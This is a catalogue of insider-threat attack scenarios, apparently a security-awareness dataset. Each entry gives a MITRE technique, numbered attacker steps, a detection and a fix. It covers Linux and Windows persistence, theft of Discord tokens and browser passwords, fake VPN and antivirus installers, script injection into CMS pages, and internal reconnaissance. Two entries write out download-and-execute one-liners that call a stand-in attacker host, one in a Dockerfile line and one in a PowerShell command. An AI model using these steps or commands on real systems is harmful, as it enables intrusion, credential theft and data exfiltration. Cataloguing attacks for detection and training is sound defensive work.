- **Target**: Linux Systems
- **Vulnerability**: User Script Persistence
- **MITRE**: T1037.005 (Shell Initialization)
- **Impact**: Persistent Credential Theft
- **Tools**: Linux Bash
- **Scenario**: Insider adds a command to .bashrc file that runs a script each time terminal opens.
- **Attack Steps**: Step 1: Open .bashrc file in home directory (nano ~/.bashrc).Step 2: Add a line like bash /home/user/.hidden/stealer.sh &.Step 3: Save and exit.Step 4: Each time user opens terminal, the stealer script runs.Step 5: It sends credentials or files silently.
- **Detection**: Monitor file changes
- **Solution**: Restrict .bashrc edits, integrity checks
- **Tags**: Bash, Linux, Startup

## Discord Token Stealer Script

- **Attack Type**: Cloud App Exploit
- **Target**: Discord App
- **Vulnerability**: Token Storage in Plaintext
- **MITRE**: T1528 (Steal Application Token)
- **Impact**: Account Hijack
- **Tools**: Python, OS module
- **Scenario**: Insider writes a script to extract Discord auth tokens and access accounts remotely.
- **Attack Steps**: Step 1: Script navigates to local Discord data folders.Step 2: Extracts stored authentication tokens.Step 3: Sends tokens to attacker server.Step 4: Attacker logs into user Discord, impersonates or steals files.Step 5: May pivot from personal to corporate servers.
- **Detection**: Monitor API usage & login IPs
- **Solution**: Token encryption, Monitor Discord access
- **Tags**: Discord, Token, Impersonation

## Script Triggered by USB Insertion

- **Attack Type**: USB Event Automation
- **Target**: Windows PC
- **Vulnerability**: Task Trigger Exploit
- **MITRE**: T1053.005 (Scheduled Task/Job)
- **Impact**: Data Theft, Persistence
- **Tools**: Windows Task Scheduler, CMD
- **Scenario**: Insider creates script that auto-runs on USB insertion via Task Scheduler.
- **Attack Steps**: Step 1: Create Task Scheduler rule: “On USB Insertion” trigger.Step 2: Task runs script to copy files or install malware.Step 3: Store script in C:\Users\Public\usb_task.bat.Step 4: Insert USB – task triggers silently.Step 5: Files copied, or backdoor installed without user noticing.
- **Detection**: Monitor new task creation
- **Solution**: Restrict auto-triggers, log USB events
- **Tags**: USB, Task Scheduler, Silent Copy

## Script as Fake VPN Launcher

- **Attack Type**: Script in Network Tools
- **Target**: Remote Workers
- **Vulnerability**: Trust in Internal Tools
- **MITRE**: T1204.002
- **Impact**: Credential Theft, Surveillance
- **Tools**: Python, EXE builder
- **Scenario**: Insider bundles malware into a fake VPN app used by remote employees.
- **Attack Steps**: Step 1: Create a launcher script that looks like a VPN app.Step 2: Show GUI saying “VPN Connected”.Step 3: In background, run keylogger or screen capture.Step 4: Distribute to remote staff via “internal tools” email.Step 5: Staff uses it, unknowingly exposing system.
- **Detection**: Check endpoint processes
- **Solution**: Use signed VPN tools, verify internal tools
- **Tags**: VPN, Remote Work, Fake Tool

## Hidden Payload in Git README

- **Attack Type**: Encoded Script in Docs
- **Target**: Git Repo Users
- **Vulnerability**: Misuse of Documentation
- **MITRE**: T1036.005 (Masquerading)
- **Impact**: Script Execution, Shell
- **Tools**: Git, Base64, PowerShell
- **Scenario**: Insider places base64-encoded malicious script in the README.md of internal Git repo.
- **Attack Steps**: Step 1: Encode PowerShell malware using base64.Step 2: Paste into README.md with caption “debug command snippet”.Step 3: Other devs copy-paste and decode to test.Step 4: Script runs and exfiltrates files or opens shell.Step 5: Attacker gains access to their system.
- **Detection**: Unusual command usage logs
- **Solution**: Educate on encoded script risks
- **Tags**: Base64, GitHub, CopyPaste

## Insider Abuses AutoHotKey for GUI Spoof

- **Attack Type**: Fake Window Attack
- **Target**: Office Systems
- **Vulnerability**: GUI Spoofing
- **MITRE**: T1556.002 (Input Prompt)
- **Impact**: Phishing Credentials
- **Tools**: AutoHotKey, Windows GUI
- **Scenario**: Insider creates a script that looks like a legit app popup asking for login.
- **Attack Steps**: Step 1: Use AutoHotKey to create a fake login window titled “Outlook Session Expired”.Step 2: User enters email and password.Step 3: Script saves to hidden .txt.Step 4: Insider collects file later.Step 5: Use credentials to access mailbox.
- **Detection**: UI Monitor Tools
- **Solution**: Train staff, verify popups
- **Tags**: GUI, Phishing, Script

## JavaScript Injection in Internal CMS

- **Attack Type**: Scripted CMS Backdoor
- **Target**: Intranet CMS
- **Vulnerability**: Lack of Script Filtering
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Cookie Theft, Redirects
- **Tools**: JavaScript, Internal CMS
- **Scenario**: Insider injects JS in a CMS announcement that runs when employees log in.
- **Attack Steps**: Step 1: Login to internal CMS with editor rights.Step 2: Insert <script> tag in a visible news section.Step 3: Script logs cookies or redirects to phishing page.Step 4: Users log in and unknowingly trigger script.Step 5: Data is sent to attacker.
- **Detection**: DOM Monitor, CSP Policy
- **Solution**: Sanitize CMS input, JS filter
- **Tags**: CMS, Internal Tool, XSS

## Auto-Sync Script via Cloud Storage

- **Attack Type**: Sync Malware Script
- **Target**: Cloud Synced Devices
- **Vulnerability**: Unchecked Startup Files
- **MITRE**: T1547.001
- **Impact**: Persistent Access
- **Tools**: Google Drive/Dropbox + Python
- **Scenario**: Insider places script in synced cloud folder, runs on boot from other devices.
- **Attack Steps**: Step 1: Insider shares a Drive folder with colleague.Step 2: Adds startup_script.bat in shared folder.Step 3: Target system syncs and runs it on boot via Startup folder.Step 4: Script logs credentials or opens connection.Step 5: Insider gets access remotely.
- **Detection**: Cloud File Monitoring
- **Solution**: Limit sync folders, scan new files
- **Tags**: Cloud, Sync, Auto Execution

## Script through Idle Mouse Monitor

- **Attack Type**: Idle Time Trigger Script
- **Target**: Office Workstations
- **Vulnerability**: Idle Time Exploitation
- **MITRE**: T1053 (Execution Trigger)
- **Impact**: Data Theft
- **Tools**: Python, pyautogui
- **Scenario**: Insider runs a script that only activates when mouse is idle for 10 mins.
- **Attack Steps**: Step 1: Write a script using pyautogui to monitor mouse movement.Step 2: If idle for 10 minutes, run data exfil script.Step 3: Run script as background task.Step 4: While user is away, script activates.Step 5: Collect screenshots, files, or access systems silently.
- **Detection**: Task Monitor, Script Watchdog
- **Solution**: Lock screen timeout, detect idle behavior
- **Tags**: Idle Monitor, pyautogui, Stealth

## Script Hidden in ISO File

- **Attack Type**: ISO Malware Dropper
- **Target**: Desktop Systems
- **Vulnerability**: ISO Autorun
- **MITRE**: T1204.002 (Malicious File)
- **Impact**: Silent Malware Execution
- **Tools**: Windows ISO Tool, .bat file
- **Scenario**: Insider sends a .iso file with a script set to autorun when mounted.
- **Attack Steps**: Step 1: Create a .bat script that installs keylogger or reverse shell.Step 2: Use an ISO creator to pack the .bat file inside and rename file to HR_Policies_2025.iso.Step 3: Share via email or USB.Step 4: When user mounts the ISO and opens file, script runs silently.Step 5: Attacker gets access or logs user activity.
- **Detection**: File extension monitoring, disable ISO execution
- **Solution**: Block ISO file types, disable autoplay
- **Tags**: ISO, Script, Autorun

## Excel Named Range Script Abuse

- **Attack Type**: Script via Excel Feature
- **Target**: Office Documents
- **Vulnerability**: Excel Feature Exploitation
- **MITRE**: T1566.001
- **Impact**: Command Execution
- **Tools**: MS Excel, VBA
- **Scenario**: Insider abuses Excel "Named Range" to trigger shell code via formula.
- **Attack Steps**: Step 1: Open Excel and create a Named Range (Formulas > Name Manager).Step 2: Set it to execute a command like cmd /c whoami when a cell updates.Step 3: Save as .xlsm file and share as “Budget Report Final”.Step 4: When coworker interacts, command runs silently.Step 5: Use this method to launch backdoor or scripts.
- **Detection**: Excel command logs, formula audits
- **Solution**: Disable dynamic ranges and macro execution
- **Tags**: Excel, Named Range, Hidden Script

## Batch Script Inside Zip Archive

- **Attack Type**: Script Dropper Archive
- **Target**: User Devices
- **Vulnerability**: ZIP Archive File Trust
- **MITRE**: T1204.002
- **Impact**: Silent Script Execution
- **Tools**: Notepad, WinRAR
- **Scenario**: Insider sends ZIP archive with a bat file disguised as documentation.
- **Attack Steps**: Step 1: Create a .bat script named Instructions.bat that steals system info.Step 2: Zip it with legit files (e.g., images, PDFs).Step 3: Send or upload as "Event_Guide_2025.zip".Step 4: Recipient unzips and clicks on the bat file.Step 5: Script runs in background and sends data.
- **Detection**: AV inspection of zip, script detection
- **Solution**: Filter zip attachments, scan contents
- **Tags**: ZIP, Archive, Script

## Malicious Shell Script in Docker Container

- **Attack Type**: DevOps Environment Exploit
- **Target**: Dev Servers
- **Vulnerability**: Insecure Container Image
- **MITRE**: T1204.003, T1059
- **Impact**: Container Backdoor
- **Tools**: Dockerfile, Bash
- **Scenario**: Insider adds shell script to Docker entrypoint that launches malware.
- **Attack Steps**: Step 1: Modify Dockerfile to include RUN wget attacker_server/script.sh && bash script.sh.Step 2: Build and push image to internal Docker registry.Step 3: Assign image to backend team for deployment.Step 4: When container starts, malware activates.Step 5: Attacker gains access to host or data inside container.
- **Detection**: Container audit, shell logs
- **Solution**: Scan images, verify builds, container security
- **Tags**: Docker, Container, DevOps

## Script Triggered via .lnk in Startup Folder

- **Attack Type**: Windows Auto-Start Abuse
- **Target**: Office Laptops
- **Vulnerability**: Startup Folder Access
- **MITRE**: T1547.001
- **Impact**: Auto Malware Execution
- **Tools**: .lnk, CMD script
- **Scenario**: Insider places a shortcut to malicious script in user’s Startup folder.
- **Attack Steps**: Step 1: Create a shortcut (.lnk) that runs a command to open malware or logger.Step 2: Navigate to C:\Users\<Name>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.Step 3: Paste shortcut inside.Step 4: On reboot, Windows runs the script automatically.Step 5: Malware activates without notice.
- **Detection**: Monitor Startup folders
- **Solution**: Lock write access, alert on shortcut creation
- **Tags**: Startup, LNK, Persistence

## PowerShell One-Liner via Run Dialog

- **Attack Type**: In-Memory Execution
- **Target**: Windows Workstations
- **Vulnerability**: In-Memory Scripting
- **MITRE**: T1059.001 (PowerShell)
- **Impact**: AV Evasion, Credential Theft
- **Tools**: PowerShell
- **Scenario**: Insider uses Win + R run dialog to execute PowerShell that runs in memory.
- **Attack Steps**: Step 1: Press Win + R, type powershell -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')".Step 2: The command runs PowerShell script without saving file to disk.Step 3: Script performs keylogging or opens shell.Step 4: Nothing written on disk; runs from memory only.Step 5: Collect data silently.
- **Detection**: Detect network calls to unknown IPs
- **Solution**: Block PowerShell bypass modes, use AppLocker
- **Tags**: PowerShell, Memory, Stealth

## Fake Antivirus Installer with Payload

- **Attack Type**: Software Installer Abuse
- **Target**: Endpoints
- **Vulnerability**: Unverified Software Install
- **MITRE**: T1204.002
- **Impact**: Remote Access, Control
- **Tools**: Inno Setup, Remote Access Tool
- **Scenario**: Insider sends a fake AV tool bundled with remote access tool.
- **Attack Steps**: Step 1: Create real-looking AV installer interface using packaging software.Step 2: Add backdoor script or install tool like njRAT.Step 3: Distribute as “AntivirusUpdate2025.exe”.Step 4: Victim installs it thinking it’s legit AV.Step 5: Attacker gets remote access.
- **Detection**: Monitor process tree, detect RAT signatures
- **Solution**: Allow only signed software installs
- **Tags**: RAT, Fake AV, Backdoor

## .hta Script via Email

- **Attack Type**: HTML Application Malware
- **Target**: Email Recipients
- **Vulnerability**: HTA Execution
- **MITRE**: T1218.005 (Mshta)
- **Impact**: Silent Malware Execution
- **Tools**: VBScript, .hta file
- **Scenario**: Insider sends .hta file that runs VBScript silently.
- **Attack Steps**: Step 1: Write a VBScript inside .hta file that downloads malware.Step 2: Email it as “Compliance_Review.hta”.Step 3: Target double-clicks file.Step 4: Script runs like a browser but executes system commands.Step 5: Malware installs without popups.
- **Detection**: Block .hta in mail filter
- **Solution**: Disable HTA handler in system
- **Tags**: HTA, VBScript, Email

## Script Triggered from Image EXIF Data

- **Attack Type**: EXIF Abuse
- **Target**: Shared Files
- **Vulnerability**: Script in Metadata
- **MITRE**: T1027.003
- **Impact**: Covert Malware Delivery
- **Tools**: ExifTool, Bash
- **Scenario**: Insider encodes script in EXIF metadata of a photo, extracts & runs locally.
- **Attack Steps**: Step 1: Use ExifTool to write a script into image metadata (e.g., Author field).Step 2: Upload image to shared drive or email.Step 3: On target system, use script to read and execute EXIF content.Step 4: Code runs like normal shell script.Step 5: Hides in plain sight.
- **Detection**: Monitor image files, metadata scanner
- **Solution**: Block EXIF parsing on unknown files
- **Tags**: EXIF, Metadata, Script

## Hidden Script via Desktop Widget

- **Attack Type**: GUI Widget Abuse
- **Target**: Workstations
- **Vulnerability**: Trusted UI Elements
- **MITRE**: T1559.001
- **Impact**: Covert Info Collection
- **Tools**: Electron, Node.js
- **Scenario**: Insider builds a desktop widget app that hides a script behind it.
- **Attack Steps**: Step 1: Build widget like “Weather Checker” in Electron.Step 2: Embed a Node.js script that sends system info.Step 3: Distribute internally for productivity or testing.Step 4: When user runs widget, it also runs script.Step 5: Sends data silently.
- **Detection**: Unusual outbound requests
- **Solution**: Vet GUI apps before internal use
- **Tags**: GUI, Electron, Covert Tool

## Script in Calendar Reminder

- **Attack Type**: Embedded Code in Reminder
- **Target**: Calendar System
- **Vulnerability**: Trust in Calendar Events
- **MITRE**: T1204.001
- **Impact**: Credential Theft or Payload Drop
- **Tools**: Outlook, HTML, PowerShell
- **Scenario**: Insider sets a meeting invite with malicious link or script in description.
- **Attack Steps**: Step 1: Create Outlook meeting invite with title “Security Training”.Step 2: In the description, embed a link to a script or disguised .hta file.Step 3: Invite team members.Step 4: When users click the link or open the file, it runs malicious code.Step 5: Attacker gains access or data.
- **Detection**: Monitor calendar event content
- **Solution**: Disable script links in invites
- **Tags**: Calendar, Outlook, Event Phishing

## JavaScript in Email Signature

- **Attack Type**: Scripted HTML Signature
- **Target**: Email/Webmail
- **Vulnerability**: HTML Signature Misuse
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Webmail Data Theft
- **Tools**: JavaScript, HTML Email
- **Scenario**: Insider adds JavaScript in email signature that activates when emails are opened in browser-based clients.
- **Attack Steps**: Step 1: Edit email signature to include a <script> tag (in HTML view).Step 2: Script logs IP or steals session tokens if webmail doesn’t sanitize content.Step 3: Each email sent triggers the script.Step 4: Collects data or redirects victims.Step 5: Insider controls script remotely.
- **Detection**: Email HTML sanitization logs
- **Solution**: Enforce plaintext signatures
- **Tags**: Email, JS, Webmail Exploit

## Script Executed via Locked Screen

- **Attack Type**: Shortcut Abuse While Locked
- **Target**: Windows Systems
- **Vulnerability**: Global Shortcut Abuse
- **MITRE**: T1059
- **Impact**: Silent Execution
- **Tools**: .lnk, CMD
- **Scenario**: Insider adds a desktop shortcut that runs script using keyboard shortcut from lock screen.
- **Attack Steps**: Step 1: Create .lnk file pointing to malicious script.Step 2: Assign a global keyboard shortcut (e.g., Ctrl+Alt+K).Step 3: Leave system locked but powered on.Step 4: Press shortcut keys from locked screen.Step 5: Script runs silently in background.
- **Detection**: Shortcut log monitoring
- **Solution**: Disable global hotkeys, restrict .lnk
- **Tags**: Lock Screen, Shortcut, Insider

## Network Drive Script Execution

- **Attack Type**: Batch Script via Network Drive
- **Target**: Network Shared Drive
- **Vulnerability**: Unscanned Executables
- **MITRE**: T1204.002
- **Impact**: Privilege Abuse, Data Theft
- **Tools**: .bat, Windows Explorer
- **Scenario**: Insider places malicious script on a mapped network drive and gets coworkers to run it.
- **Attack Steps**: Step 1: Create a .bat script that copies sensitive files or adds new user account.Step 2: Place it in shared department drive.Step 3: Rename as “Monthly_Cleanup_Tool.bat”.Step 4: Ask colleagues to run it.Step 5: Script executes and performs malicious actions.
- **Detection**: Script execution from network logs
- **Solution**: Block .bat from executing over network
- **Tags**: Batch File, Network Drive

## Misuse of Auto-Update Feature

- **Attack Type**: Auto-Update Exploit
- **Target**: Internal Tools
- **Vulnerability**: Insecure Update Process
- **MITRE**: T1505.003
- **Impact**: Backdoor Installation
- **Tools**: Python, Updater Script
- **Scenario**: Insider adds script to an auto-update feature in internal tools.
- **Attack Steps**: Step 1: Locate internal tool with auto-update feature (e.g., update.py).Step 2: Modify script to download and run an additional payload.Step 3: Wait until users run update.Step 4: Update appears normal, but also installs malware.Step 5: Insider maintains persistent access.
- **Detection**: Monitor version file hashes
- **Solution**: Use signed, verified updates
- **Tags**: Auto Update, Script Hook

## Hidden VBS Script via Rename Trick

- **Attack Type**: Fake File Type Attack
- **Target**: Email, Shared Folder
- **Vulnerability**: Hidden File Extension Abuse
- **MITRE**: T1204.002
- **Impact**: Script Execution
- **Tools**: VBScript
- **Scenario**: Insider renames file.vbs as file.txt.vbs and shares with coworkers.
- **Attack Steps**: Step 1: Write a .vbs script that launches calculator or logs keys.Step 2: Rename file to MeetingNotes.txt.vbs.Step 3: Send to coworkers with subject: “Meeting notes attached”.Step 4: Windows may hide known extensions, so it appears as .txt.Step 5: Victim double-clicks and script runs.
- **Detection**: File extension audit
- **Solution**: Show full extensions, block .vbs
- **Tags**: VBS, File Rename, Extension Trick

## Fake Software Crash Prompt

- **Attack Type**: Credential Phishing via GUI
- **Target**: Workstation GUI
- **Vulnerability**: Trust in System Dialogs
- **MITRE**: T1556.002
- **Impact**: Local Credential Theft
- **Tools**: AutoHotKey, GUI script
- **Scenario**: Insider launches fake crash window asking for admin re-login.
- **Attack Steps**: Step 1: Use AutoHotKey to design a window titled “Application Error”.Step 2: Window says “Please re-enter credentials to recover”.Step 3: Capture and save the input to a file.Step 4: Display “System Restored” message.Step 5: Collect stored credentials later.
- **Detection**: Unexpected dialog alerting tools
- **Solution**: Use MFA, educate users
- **Tags**: GUI, Fake Prompt, Credential Theft

## Script Embedded in Voice Assistant Trigger

- **Attack Type**: Voice Command Injection
- **Target**: Smart Devices / Workstation
- **Vulnerability**: Voice-Paired Device Risk
- **MITRE**: T1204.001
- **Impact**: Remote Trigger, Browser Exploit
- **Tools**: Google Assistant, Alexa, Script URL
- **Scenario**: Insider uses smart speaker to trigger script on a paired machine.
- **Attack Steps**: Step 1: Create a command like “OK Google, run meeting script”.Step 2: Configure it to open a URL that triggers malware via browser.Step 3: In an empty room, speak the command aloud.Step 4: If machine is paired, browser opens URL silently.Step 5: Script runs payload.
- **Detection**: Log unexpected URL opens
- **Solution**: Disable unapproved assistant actions
- **Tags**: Voice, Triggered Script, IOT

## Hidden Script in Fonts Folder

- **Attack Type**: System Folder Abuse
- **Target**: Local PC
- **Vulnerability**: Hidden Folder Abuse
- **MITRE**: T1036.005
- **Impact**: Data Theft
- **Tools**: Windows Fonts, .bat
- **Scenario**: Insider places script in Windows Fonts folder, which may be skipped by AV.
- **Attack Steps**: Step 1: Create script named arialsetup.bat that steals files.Step 2: Move it into C:\Windows\Fonts (if permissions allow).Step 3: Trigger execution via scheduled task or shortcut.Step 4: Script runs from hidden location.Step 5: Data is exfiltrated.
- **Detection**: Folder access logs, scan skipped paths
- **Solution**: Lock down hidden system folders
- **Tags**: Hidden Script, Fonts, Obfuscation

## USB Device with Auto Command

- **Attack Type**: BadUSB HID Attack
- **Target**: USB Input Devices
- **Vulnerability**: HID Exploit
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: System Compromise
- **Tools**: Rubber Ducky, Bash Bunny
- **Scenario**: Insider uses a programmable USB device that acts like a keyboard and types commands.
- **Attack Steps**: Step 1: Program USB to simulate keyboard input (e.g., cmd /c powershell commands).Step 2: Plug into system – it types commands automatically.Step 3: Commands run PowerShell to create a new user or upload data.Step 4: Unplug within seconds.Step 5: Attacker gets access or leaves a backdoor.
- **Detection**: Monitor unauthorized USB devices
- **Solution**: Block HID-class devices
- **Tags**: BadUSB, Rubber Ducky, Hardware Attack

## Accessing Shared Network Drive

- **Attack Type**: Internal Recon
- **Target**: File Server
- **Vulnerability**: Misconfigured permissions
- **MITRE**: T1039 - Data from Network Shared Drive
- **Impact**: Data exfiltration, reputation damage
- **Tools**: Windows Explorer
- **Scenario**: An employee finds sensitive documents by browsing shared folders that are not properly access-controlled.
- **Attack Steps**: Step 1: Log into your organization-issued computer normally. Step 2: Open File Explorer (Windows key + E). Step 3: Click on Network from the left panel. Step 4: Browse the visible devices and shared folders. Step 5: Open any folders you can access. Step 6: Look for files like passwords.xlsx, clients.csv, or budget_2025.docx. Step 7: Save copies to a USB drive or email.
- **Detection**: File access logging, DLP tools
- **Solution**: Apply least-privilege folder permissions; enable auditing
- **Tags**: windows-share, access-rights, internal-recon

## Identifying HR Emails from Outlook

- **Attack Type**: Email Enumeration
- **Target**: Mail Server
- **Vulnerability**: Poor email directory controls
- **MITRE**: T1087.002 - Domain Account
- **Impact**: Targeted spear-phishing
- **Tools**: Outlook
- **Scenario**: The insider gathers internal HR contact lists for phishing purposes by accessing Outlook Global Address List.
- **Attack Steps**: Step 1: Open Outlook on your corporate device. Step 2: Click on New Email. Step 3: Click the "To" field. Step 4: Browse or search the Global Address List (GAL). Step 5: Search for terms like "HR", "Payroll", "Finance". Step 6: Copy the emails and save them in a file.
- **Detection**: Email monitoring, SIEM alerting
- **Solution**: Restrict GAL visibility; HR aliases instead of direct IDs
- **Tags**: outlook, email-enum, hr-target

## Gathering Host Info via Command Prompt

- **Attack Type**: Internal Recon
- **Target**: Workstation
- **Vulnerability**: No endpoint command restrictions
- **MITRE**: T1016 - System Network Configuration Discovery
- **Impact**: Helps plan lateral movement
- **Tools**: CMD (Command Prompt)
- **Scenario**: The insider gathers host system information such as computer name, IP, and domain to plan further internal attacks.
- **Attack Steps**: Step 1: Click on Start > type cmd and open Command Prompt. Step 2: Type hostname – this gives you your computer name. Step 3: Type ipconfig – this shows your IP address and network details. Step 4: Type set user – shows your username. Step 5: Type systeminfo – gives OS version, patch level, etc. Step 6: Write this down in a Notepad or email to yourself.
- **Detection**: EDR monitoring, script restriction
- **Solution**: Disable command-line tools for non-IT users
- **Tags**: cmd, systeminfo, ipconfig, recon

## Mapping Internal Network using Ping Sweep

- **Attack Type**: Network Discovery
- **Target**: Network
- **Vulnerability**: No internal firewall controls
- **MITRE**: T1018 - Remote System Discovery
- **Impact**: Enables insider to find other systems
- **Tools**: Command Prompt
- **Scenario**: The insider uses simple ping commands to discover live systems inside the network.
- **Attack Steps**: Step 1: Open Command Prompt. Step 2: Run ping 192.168.1.1 – see if the device responds. Step 3: Continue pinging nearby IPs (192.168.1.2, 192.168.1.3, etc.). Step 4: Note which IPs give a reply – these are live systems. Step 5: Write down live IPs to plan future access.
- **Detection**: Network anomaly detection
- **Solution**: Block internal ICMP traffic; segment network
- **Tags**: ping-sweep, recon, internal-mapping

## Listing Users via Net User Command

- **Attack Type**: Account Enumeration
- **Target**: Workstation / Server
- **Vulnerability**: Weak access monitoring
- **MITRE**: T1087.001 - Local Account Enumeration
- **Impact**: Credential guessing / Privilege escalation
- **Tools**: CMD
- **Scenario**: An insider uses basic commands to see which users exist in the system for potential account guessing.
- **Attack Steps**: Step 1: Open Command Prompt (cmd). Step 2: Type net user – this will list all user accounts on the system. Step 3: Identify interesting usernames like admin, backup, john.doe. Step 4: Save this list for future brute-force or social engineering.
- **Detection**: SIEM logs, user activity monitoring
- **Solution**: Limit who can run net commands, use RBAC
- **Tags**: net-user, enumeration, credential

## Browsing Internal Web Portals

- **Attack Type**: Web Recon
- **Target**: Intranet Web Server
- **Vulnerability**: Poor access controls
- **MITRE**: T1213 - Data from Information Repositories
- **Impact**: Unauthorized data access
- **Tools**: Web Browser
- **Scenario**: Insider browses internal company web apps via known URLs to discover misconfigured dashboards or services.
- **Attack Steps**: Step 1: Open Chrome/Edge. Step 2: Enter URLs like intranet.company.local, portal, admin, or dashboard. Step 3: Log in using your employee credentials. Step 4: Browse for features like reports, user data, backend access. Step 5: Screenshot or download any exposed sensitive data.
- **Detection**: Web logs, session monitoring
- **Solution**: Role-based access, internal WAF
- **Tags**: internal-web, dashboard-access

## Exploiting Network Printer for Documents

- **Attack Type**: Device Misuse
- **Target**: Printer/Scanner
- **Vulnerability**: Default credentials, no audit trail
- **MITRE**: T1552.001 - Device Configuration
- **Impact**: Leak of printed/scanned data
- **Tools**: Web Browser
- **Scenario**: Employee accesses internal network printer interface and retrieves scanned documents or fax logs.
- **Attack Steps**: Step 1: Open browser and go to printer IP like 192.168.1.25. Step 2: Use default credentials like admin:admin or no password. Step 3: Browse through Scan History or Fax logs. Step 4: Download or print sensitive scans.
- **Detection**: Printer logs, NAC monitoring
- **Solution**: Change default passwords, disable web interface
- **Tags**: printer-recon, default-creds

## ARP Cache Inspection for Network Map

- **Attack Type**: Network Recon
- **Target**: Workstation
- **Vulnerability**: No ARP filtering or segmentation
- **MITRE**: T1518 - Software Discovery
- **Impact**: Aids lateral movement
- **Tools**: CMD
- **Scenario**: Insider inspects ARP cache to see devices recently communicated with, to build a map of internal devices.
- **Attack Steps**: Step 1: Open Command Prompt. Step 2: Type arp -a and press Enter. Step 3: View list of IP and MAC addresses. Step 4: Note down IPs that look like internal routers, servers, other PCs. Step 5: Match this data to known systems (HR, Finance, etc.).
- **Detection**: Monitor ARP traffic, endpoint agents
- **Solution**: Segment broadcast domains, inspect logs
- **Tags**: arp, internal-map, endpoint

## Discovering Open Ports Using Netstat

- **Attack Type**: Port Enumeration
- **Target**: Workstation
- **Vulnerability**: Port visibility with no restrictions
- **MITRE**: T1049 - System Network Connections Discovery
- **Impact**: Information gathering for future attacks
- **Tools**: CMD
- **Scenario**: Insider checks which internal services their machine is connected to by inspecting local ports.
- **Attack Steps**: Step 1: Open Command Prompt. Step 2: Type netstat -an and press Enter. Step 3: Observe the ESTABLISHED or LISTENING entries. Step 4: Note internal IP addresses and port numbers like 80, 443, 3306. Step 5: Use this to guess what services (web, database) are in use internally.
- **Detection**: Endpoint logging tools
- **Solution**: Restrict network visibility, port-based ACLs
- **Tags**: netstat, open-ports, enumeration

## Mapping Shared Printers and Drives

- **Attack Type**: Resource Enumeration
- **Target**: File Server, Printer Server
- **Vulnerability**: Insecure share configuration
- **MITRE**: T1069.001 - Permission Group Discovery
- **Impact**: Infrastructure intelligence
- **Tools**: File Explorer, Control Panel
- **Scenario**: Employee maps network drives and printers available on the internal network to gather internal infrastructure layout.
- **Attack Steps**: Step 1: Press Windows + R, type \\server or \\192.168.1.5 and press Enter. Step 2: See list of shared folders and printers. Step 3: Right-click and connect to drives or printers. Step 4: Open shared folders to check for exposed files. Step 5: Document names of departments, systems, printer models.
- **Detection**: File/share access logs
- **Solution**: Restrict printer mapping and shared folder access
- **Tags**: printer-discovery, share-enum

## Using whoami and net config to Confirm Identity

- **Attack Type**: System Recon
- **Target**: Endpoint
- **Vulnerability**: No user monitoring tools
- **MITRE**: T1033 - System Owner/User Discovery
- **Impact**: Supportive info for credential attacks
- **Tools**: CMD
- **Scenario**: Employee uses simple commands to confirm their current login and domain, which helps them plan lateral movement.
- **Attack Steps**: Step 1: Open Command Prompt. Step 2: Type whoami to confirm your domain and username. Step 3: Type net config workstation to see domain, computer name, and user. Step 4: Note this info for later access attempts.
- **Detection**: Command monitoring (EDR)
- **Solution**: Block commands for non-admin users
- **Tags**: whoami, domain-info

## Looking for Old Files in Temp Folders

- **Attack Type**: File Scavenging
- **Target**: Workstation
- **Vulnerability**: Lack of auto cleanup, sensitive data in temp
- **MITRE**: T1530 - Data from Local System
- **Impact**: Exposure of cached sensitive data
- **Tools**: File Explorer
- **Scenario**: Insider browses %TEMP% and other directories to find logs, credentials, screenshots, or cached files.
- **Attack Steps**: Step 1: Press Windows + R, type %TEMP% and hit Enter. Step 2: Sort files by type and date. Step 3: Look for .txt, .log, .html, or screenshots. Step 4: Open and review these files for any sensitive information. Step 5: Save anything useful for later abuse.
- **Detection**: File system scanning tools
- **Solution**: Temp folder cleanup policy, App sandboxing
- **Tags**: temp-scan, file-recon

## Querying AD Info using whoami /groups

- **Attack Type**: Privilege Enumeration
- **Target**: AD Environment
- **Vulnerability**: Unrestricted group visibility
- **MITRE**: T1069.002 - Domain Group Discovery
- **Impact**: Group abuse or targeted access
- **Tools**: CMD
- **Scenario**: Insider uses built-in command to learn their user groups and role in Active Directory.
- **Attack Steps**: Step 1: Open Command Prompt. Step 2: Type whoami /groups and press Enter. Step 3: Note groups like Domain Admins, HR, IT Support. Step 4: Determine what systems you may have access to via group rights.
- **Detection**: AD query logging
- **Solution**: Group policy restrictions, RBAC
- **Tags**: ad-groups, whoami

## Extracting Browser Saved Passwords

- **Attack Type**: Credential Recon
- **Target**: Browser
- **Vulnerability**: Weak credential protection
- **MITRE**: T1555.003 - Credentials from Password Stores
- **Impact**: Credential theft
- **Tools**: Chrome / Firefox
- **Scenario**: Insider uses browser's password manager to view saved internal credentials.
- **Attack Steps**: Step 1: Open Chrome. Step 2: Click top-right ⋮ → Settings → Autofill → Passwords. Step 3: Click eye icon next to saved passwords (Windows login may be required). Step 4: Look for entries with intranet, vpn, or internal systems. Step 5: Note down or exfiltrate useful credentials.
- **Detection**: Browser audits, security policies
- **Solution**: Disable saving passwords, use Vaults
- **Tags**: browser-passwords, internal-login

## Browsing Email Attachments for Sensitive Data

- **Attack Type**: Mailbox Recon
- **Target**: Email Server
- **Vulnerability**: No DLP or attachment monitoring
- **MITRE**: T1114.002 - Remote Email Collection
- **Impact**: Intellectual property loss
- **Tools**: Outlook
- **Scenario**: Insider reviews past email attachments to find project plans, contracts, and HR data.
- **Attack Steps**: Step 1: Open Outlook. Step 2: Go to Sent Items, Inbox, and Deleted Items. Step 3: Search for file types: .docx, .xlsx, .pdf. Step 4: Use search terms like “salary”, “project plan”, “confidential”. Step 5: Save relevant attachments.
- **Detection**: Email DLP, attachment scanning
- **Solution**: Educate users, restrict internal forwarding
- **Tags**: outlook, attachment-scan

## Using tasklist to See Running Processes

- **Attack Type**: System Recon
- **Target**: Workstation / Server
- **Vulnerability**: No process visibility restrictions
- **MITRE**: T1057 - Process Discovery
- **Impact**: Helps identify software in use
- **Tools**: CMD
- **Scenario**: The insider checks for running software processes which might indicate what applications the system is using, like database or monitoring tools.
- **Attack Steps**: Step 1: Open Command Prompt. Step 2: Type tasklist and press Enter. Step 3: Review running programs like sqlservr.exe, chrome.exe, or java.exe. Step 4: Note interesting applications or system tools.
- **Detection**: EDR monitoring
- **Solution**: Limit access to tasklist, role segregation
- **Tags**: process-enum, system-recon

